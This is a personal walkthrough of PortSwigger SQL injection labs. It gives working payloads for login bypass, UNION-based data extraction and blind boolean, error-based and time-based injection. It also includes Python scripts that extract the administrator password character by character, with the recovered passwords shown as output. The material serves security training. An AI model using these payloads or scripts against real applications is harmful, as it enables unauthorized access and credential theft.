# SQLi Labs

Labs Link: https://portswigger.net/web-security/sql-injection

# **Retrieving hidden data**

### **Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

```bash
/filter?category=Clothing'+OR+1=1+--+
```

# **Subverting application logic**

### **Lab: SQL injection vulnerability allowing login bypass**

```bash
csrf=..&username=administrator'--'&password=test
```

```bash
csrf=..&username=administrator'+OR+1=1+--+&password=test
```

# **SQL injection UNION attacks**

https://portswigger.net/web-security/sql-injection/union-attacks

The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query. For example:

```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

This SQL query returns a single result set with two columns, containing values from columns `a` and `b` in `table1` and columns `c` and `d` in `table2`.

For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To figure out the number of columns in SQL injection, two technique is used.

- one using the `ORDER BY` clause
    
    ```bash
    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--
    etc.
    ```
    
    When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:
    
    ```
    The ORDER BY position number 3 is out of range of the number of items in the select list.
    ```
    
- second using the `UNION` clause
    
    ```
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--
    etc.
    ```
    
    If the number of nulls does not match the number of columns, the database returns an error, such as:
    
    ```
    All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
    ```
    

### **Lab: SQL injection UNION attack, determining the number of columns returned by the query**

payload: 1

```bash
GET /filter?category=Clothing, shoes and accessories' UNION SELECT NULL,NULL,NULL,NULL--
```

2

```bash
GET /filter?category=Clothing, shoes and accessories' ORDER BY 3--
```

More than 3, the server response with code 500 which means our payload reached the server end but a bug occurred 

```bash
HTTP/2 500 Internal Server Error
```

# **Database-specific syntax**

https://portswigger.net/web-security/sql-injection/cheat-sheet

# **Finding columns with a useful data type**

https://portswigger.net/web-security/sql-injection/union-attacks#:~:text=Determining%20the%20number%20of%20columns%20required

After finding the number of columns, now to find the column that contains string data type, we going to test each column in turn:

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

if the data type is not compatible with string type, a database error will occur:

```bash
Conversion failed when converting the varchar value 'a' to data type int.
```

### **Lab: SQL injection UNION attack, finding a column containing text**

1- First: determine the number of columns

```bash
GET /filter?category=' ORDER BY 3--
```

more than 3, the server response with:

```bash
HTTP/2 500 Internal Server Error
```

2- Second: find the column that is compatible with string data type

```bash
GET /filter?category=' UNION SELECT 'a',NULL,NULL--   -> 500 error
GET /filter?category=' UNION SELECT NULL,'a',NULL--   -> 200 OK
GET /filter?category=' UNION SELECT NULL,NULL,'a'--   -> 500 error
```

# **Using a SQL injection UNION attack to retrieve interesting data**

https://portswigger.net/web-security/sql-injection/union-attacks#:~:text=Using%20a%20SQL%20injection%20UNION%20attack%20to%20retrieve%20interesting%20data

Suppose that:

- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the `WHERE` clause.
- The database contains a table called `users` with the columns `username` and `password`.

In this example, you can retrieve the contents of the `users` table by submitting the input:

```
' UNION SELECT username, password FROM users--
```

### **Lab: SQL injection UNION attack, retrieving data from other tables**

 To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.
        

1. Find the number of columns 
    
    ```bash
    GET /filter?category=Corporate gifts' ORDER BY 2--
    ```
    
    Two columns
    
2. Check if they were compatible with string data type
    
    ```bash
    /filter?category=Corporate gifts' UNION SELECT 'a','a'--
    ```
    
    Both of the columns can hold string, this confirm when i try a number instead of string
    
3. Retrieve information
    
    ```bash
    GET /filter?category=Corporate gifts' UNION SELECT username,password FROM users--
    ```
    
    result:
    
    ```
    carlos: 7vzf2351zvkbegsyh32h
    administrator: yjkzas8wtbaorbryn9ba
    ...
    ```
    

# **Retrieving multiple values within a single column**

https://portswigger.net/web-security/sql-injection/union-attacks#:~:text=Retrieving%20multiple%20values%20within%20a%20single%20column

You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

```
' UNION SELECT username || '~' || password FROM users--
```

Result:

```
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

### **Lab: SQL injection UNION attack, retrieving multiple values in a single column**

This technique is useful when the current view only returns a single column, so we have to concatenate multiple columns in a single column. 

When testing for the columns number, it returned two columns 

```
GET /filter?category=Food & Drink' ORDER BY 2--
```

But when testing the string data types, the second column found to be compatible with string data type, unlike the first one

```
GET /filter?category=Food+%26+Drink'+UNION+SELECT+NULL,'a'--
```

which mean we need to combine two columns in the second column

```
GET /filter?category=Food & Drink' UNION SELECT NULL,username || '~' || password FROM users-- 
```

result:

```
wiener~o6oldd9ifuw8er0058pp
administrator~9lqasvzn1rv19w3es9gu
...
```

# **Blind SQL injection**

https://portswigger.net/web-security/sql-injection/blind

## Exploiting blind SQL injection by triggering conditional responses

Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

When a request containing a `TrackingId` cookie is processed, the application uses a SQL query to determine whether this is a known user:

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

We can differentiate between true and false based on:

- “Welcome Back” → True
- Anything else → False

### **Lab: Blind SQL injection with conditional responses**

PayloadAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md#boolean-based-injection

True:

```
Cookie: TrackingId=Lgp0IVSB5C5aFSyc'+AND+'1'='1; session=7HHo90hjPSAcLzKQDdLrI9eSZYmdfHek
```

False

```
Cookie: TrackingId=Lgp0IVSB5C5aFSyc'+AND+'1'='2; session=7HHo90hjPSAcLzKQDdLrI9eSZYmdfHek
```

True:

```
Cookie: TrackingId=Lgp0IVSB5C5aFSyc' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 1, 1) = 'n;
```

binary search to find the administrator password:

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://0a7e002a03d413ef80c6c14e000e00b7.web-security-academy.net/"
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
SESSION = "HKyxtaF16ywYBqKjPJWSo0xlXGMkVacR"

def is_true(condition):
    payload = f"xSkjjLijQ385XVYZ' AND {condition}--"
    cookie = {"TrackingId": payload, "session": SESSION}
    r = requests.get(URL, cookies=cookie, proxies=proxy, verify=False)
    return "Welcome back!" in r.text

text = ""
for pos in range(1, 21):          # 1-indexed, 20-char password
    low, high = 32, 126           # printable ASCII range
    # stop once we've walked past the end of the string
    if not is_true(f"LENGTH((SELECT Password FROM Users WHERE Username='administrator')) >= {pos}"):
        break
    while low < high:
        mid = (low + high) // 2
        cond = (f"ASCII(SUBSTRING((SELECT Password FROM Users "
                f"WHERE Username='administrator'),{pos},1)) > {mid}")
        if is_true(cond):
            low = mid + 1
        else:
            high = mid
    text += chr(low)
    print(f"Password so far.. {text}")

print(f"\nFinal: {text}")
```

```
...
Password so far.. xfk8ym60wp7n29g2tk
Password so far.. xfk8ym60wp7n29g2tkn
Password so far.. xfk8ym60wp7n29g2tkn3

Final: xfk8ym60wp7n29g2tkn3

```

## **Error-based SQL injection**

https://portswigger.net/web-security/sql-injection/blind#:~:text=Exploiting%20blind%20SQL%20injection%20by%20triggering%20conditional%20errors,-Some

> You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message.
> 

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true:

- With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
- With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.

If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.

Using this technique, you can retrieve data by testing one character at a time:

```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

### **Lab: Blind SQL injection with conditional errors**

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message. 

This query caused  `500 Internal Server Error`

```python
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

even this caused the same error

```python
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

This means the subquery is erroring *unconditionally*, before  `1/0` ever gets a chance to fire conditionally. Two reasons for that on Oracle:

1.  **Missing `FROM dual`** : On Oracle, **every `SELECT` must have a `FROM` clause** — there's no bare `SELECT CASE ...`. So:
    
    ```python
    (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)
    ```
    
    throws `ORA-00923: FROM keyword not found` on *every* request, regardless of the condition. Both your true and false versions error identically
    
    MySQL/Postgres/SQL Server allow `SELECT` without `FROM`, which is why this shape works elsewhere but not here. The fix:
    
    ```
    TrackingId=uvJJiUhvb6lOCQuw' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END FROM dual)='a
    ```
    
    - `1=1` → evaluates `1/0` → **divide-by-zero error** → 500 / error page
    - `1=2` → returns `'a'` → closes cleanly against the query's trailing quote → **normal page**
2. **Branch type consistency (secondary):** `CASE` wants its `THEN`/`ELSE` results to be compatible types. `1/0` is a number, `'a'` is a string. The stock lab payload gets away with it because the `1/0` branch errors before type coercion matters, but if you ever see `ORA-01722: invalid number` instead of the divide-by-zero, that's **the mismatch.** The bulletproof version keeps both branches as strings:
    
    ```
    ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
    ```
    
    `TO_CHAR(1/0)` still triggers the divide-by-zero when the branch is reached, but now both arms are `VARCHAR`, so nothing errors for the wrong reason.
    

True

```python
AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
```

False:

```python
AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
```

if it true, the server will throw `500 Internal Server Error` 

The length of the password is 19, i confirmed this by:

```python
Cookie: TrackingId=yfEfTrooEQ2T5rBZ'||(SELECT CASE WHEN LENGTH(password)>19 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'; s
```

```python
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

Automating the process:

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://0aec00b90462c55f807b9a60002d00d7.web-security-academy.net/"
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
SESSION = "N29Hse3Gdce0EwdrrMnCLSSmBbWqoXms"

def errors(cond):
    payload = f"yfEfTrooEQ2T5rBZ' {cond}"
    cookie = {"TrackingId": payload, "session": SESSION}
    r = requests.get(URL, cookies=cookie, proxies=proxy, verify=False)
    return r.status_code == 500

text = ""
for pos in range(1, 21):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        cond = (f"||(SELECT CASE WHEN ASCII(SUBSTR(password,{pos},1)) > {mid} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'")
        if errors(cond):
            low = mid + 1
        else:
            high = mid
    text += chr(low)
    print(f"Password so far.. {text}")

print(f"\nFinal: {text}")
```

```bash
$ python3 test.py 
...
Final: 3dogi24yvdx5j0dq05i2
```

## **Extracting sensitive data via verbose SQL error messages**

https://portswigger.net/web-security/sql-injection/blind#:~:text=Solved-,Extracting%20sensitive%20data%20via%20verbose%20SQL%20error%20messages

Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an `id` parameter:

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

This shows the full query that the application constructed using our input which makes constructing the attack easier 

### **Lab: Visible error-based SQL injection**

adding a single quote in the end of the TrackingId `Cookie: TrackingId=KgK7BkpI0h5c8Fsj’`  result in 500 server error and this error message:

```bash
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'KgK7BkpI0h5c8Fsj''. Expected  char
```

Now to concatenate a query next to `SELECT * FROM tracking WHERE id = 'KgK7BkpI0h5c8Fsj’` add `||` and `—` to comment out everything after it

> The **`CAST()` function in SQL** is a built-in tool used to **convert an expression or value from one data type to another. for example converting a string to int**
> 
> 
> ```sql
> SELECT CAST('100' AS INT) + 50;
> -- Result: 150
> ```
> 

```bash
Cookie: TrackingId=KgK7BkpI0h5c8Fsj' ||CAST((SELECT password FROM users) AS int)--; session=VDfMTu7YtBM29LroYxC8wrcNEarAMZjo
```

response:

```bash
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'KgK7BkpI0h5c8Fsj' ||CAST((SELECT password FROM users) AS int'. Expected  char
```

This means that the password columns contains string datatype not int. 

I tested if we can leak the database version 

```bash
Cookie: TrackingId=KgK7BkpI0h5c8Fsj' || CAST(version() AS numeric) || '; session=.. 
```

and got this error:

```bash
ERROR: invalid input syntax for type numeric: "PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"
```

so the database is **PostgreSQL 12.22**

I first tested this query 

```sql
Cookie: TrackingId=KgK7BkpI0h5c8Fsj' SELECT CAST((SELECT password FROM users LIMIT 1) AS int)--; session=VDfMTu7YtBM29LroYxC8wrcNEarAMZjo
```

result:

```sql
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'KgK7BkpI0h5c8Fsj'SELECT CAST((SELECT password FROM users LIM'. Expected  char
```

This error occurred due to a character limit so we removed the TrackingId value and added 1=CAST because without it, it will result in `“AND condition must be a boolean expression.”`

```sql
Cookie: TrackingId='AND  1=CAST((SELECT password FROM users LIMIT 1) AS int)--; session=VDfMTu7YtBM29LroYxC8wrcNEarAMZjo
```

The result leaked the admin password

```sql
ERROR: invalid input syntax for type integer: "92f5szbyev0x4npodn6n"
```

## **Exploiting blind SQL injection by triggering time delays**

https://portswigger.net/web-security/sql-injection/blind#:~:text=Exploiting%20blind%20SQL%20injection%20by%20triggering%20time%20delays

The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

- The first of these inputs does not trigger a delay, because the condition `1=2` is false.
- The second input triggers a delay of 10 seconds, because the condition `1=1` is true.

Using this technique, we can retrieve data by testing one character at a time:

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

### **Lab: Blind SQL injection with time delays**

1. **Test PostgreSQL Syntax**
    - **Inline / Subquery:** `'; SELECT pg_sleep(10)--`
    - **String Concatenation:** `'||pg_sleep(10)--`

**2. Test MySQL / MariaDB Syntax**

- **Conditional / Logical:** `' OR SLEEP(10)--`
- **Stacked Queries:** `; SELECT SLEEP(10);--`

**3. Test Microsoft SQL Server (MS SQL) Syntax**

- **Stacked Statement:** `; WAITFOR DELAY '0:0:10'--`
- **Conditional Execution:** `' IF (1=1) WAITFOR DELAY '0:0:10'--`

**4. Test Oracle Database Syntax**

- **Subquery:** `' AND (SELECT dbms_pipe.receive_message(('a'),10) FROM dual)='a'--`
- **String Concatenation:** `'||dbms_pipe.receive_message(('a'),10)--`

the postgre synatx worked

```sql
Cookie: TrackingId=0ecGJpGQxkm6M5H7'%3b+SELECT+pg_sleep(5)--;
```

### **Lab: Blind SQL injection with time delays and information retrieval**

https://portswigger.net/web-security/sql-injection/cheat-sheet#:~:text=Conditional%20time%20delays

```sql
CASE WHEN (condition) THEN pg_sleep(seconds) ELSE pg_sleep(0) END
```

for checking length

```sql
CASE WHEN (LENGTH((SELECT Password FROM Users WHERE Username='administrator')) >= 21) THEN pg_sleep(5) ELSE pg_sleep(0) END
```

so it was 21

```sql
CASE WHEN (ASCII(SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),{pos},1)) > {mid}) THEN pg_sleep(4) ELSE pg_sleep(0) END
```

final payload:

```python
import requests
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://0a560063045e881b83f2e60c00bb0017.web-security-academy.net/"
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
SESSION = ".."

def check_condition_time(condition, threshold: float=5.0) -> bool:
    
    start_time = time.perf_counter()
    try:
        payload = f"xSkjjLijQ385XVYZ' {condition}--"
        cookie = {"TrackingId": payload, "session": SESSION}
        r = requests.get(URL, cookies=cookie, proxies=proxy, verify=False)
        elapsed_time = time.perf_counter() - start_time

        # return True if the elapsed time excceds the threshold 
        return elapsed_time > threshold
    except requests.RequestException as e:
        print(f"Request Faild: {e}")

text = ""
for pos in range(1, 21):          # 1-indexed, 20-char password
    low, high = 32, 126           # printable ASCII range
    # stop once we've walked past the end of the string
    if not check_condition_time(f"|| CASE WHEN (LENGTH((SELECT Password FROM Users WHERE Username='administrator')) >= {pos}) THEN pg_sleep(5) ELSE pg_sleep(0) END"):
        break
    while low < high:
        mid = (low + high) // 2
        cond = (f"|| CASE WHEN (ASCII(SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),{pos},1)) > {mid}) THEN pg_sleep(4) ELSE pg_sleep(0) END")
        if check_condition_time(cond):
            low = mid + 1
        else:
            high = mid
    text += chr(low)
    print(f"Password so far.. {text}")

print(f"\nFinal: {text}")
```